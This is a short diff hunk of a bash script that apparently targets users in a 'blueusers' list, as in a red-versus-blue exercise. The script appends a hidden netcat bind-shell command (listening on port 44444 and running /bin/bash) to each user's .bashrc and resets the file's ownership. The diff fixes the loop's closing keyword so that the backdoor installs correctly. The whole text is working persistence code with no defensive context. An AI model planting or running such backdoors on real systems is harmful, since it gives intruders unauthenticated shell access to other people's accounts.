@@ -32,4 +32,4 @@ for user in "${blueusers[@]}"; do
     ip=$(hostname -I | awk '{print $1}')
     echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$user/.bashrc"
     chown "$user:$user" "/home/$user/.bashrc"
-do
+done
